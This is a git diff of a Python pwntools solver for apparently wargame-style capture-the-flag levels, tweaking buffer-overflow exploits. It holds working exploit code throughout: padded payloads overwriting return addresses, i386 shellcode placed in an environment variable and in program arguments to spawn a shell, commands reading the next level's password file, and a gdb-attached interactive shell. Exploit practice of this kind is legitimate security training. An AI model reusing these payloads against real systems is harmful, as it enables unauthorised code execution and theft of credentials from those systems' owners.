@@ -28,7 +28,6 @@ class Solver(object):
 
 
     def getFlag(self, shell):
-        shell.clean()
         shell.sendline('cat /etc/%s_pass/%s%d' % (self.game, self.game, self.level+1))
         flag = shell.recvline().split()
         log.info('Flag: {0}'.format(flag))
@@ -61,23 +60,30 @@ payload = ('a'*20).encode("utf-8") + p32(0xdeadbeef)
 sh = s.conn.run(s.getBin())
 log.info("Payload: {0}".format(payload))
 sh.sendline(payload)
+sh.clean()
 s.setPassword(s.getFlag(sh))
 s.cleanup()
 
 
 s.prepare()
 sh = s.conn.process(s.getBin(), env={'EGG' : asm(shellcraft.i386.linux.sh())})
+sh.clean()
 s.setPassword(s.getFlag(sh))
 s.cleanup()
 
 s.prepare()
-payload = ('a'*88).encode("utf-8")
-payload += asm(shellcraft.i386.sh())
+payload = ('a'*87).encode("utf-8")
+payload += asm(shellcraft.i386.linux.sh())
 payload += p32(0xffffd610)
 log.info("Payload: {0}".format(payload))
 sh = s.conn.process([s.getBin(), payload])
-#  s.conn.interactive([s.getBin(), payload])
-s.setPassword(s.getFlag(sh))
+gdb.attach(sh, '''
+    break main
+    r
+    x/10xw $esp
+    ''')
+sh.interactive()
+#  s.setPassword(s.getFlag(sh))
 s.cleanup()
 
 
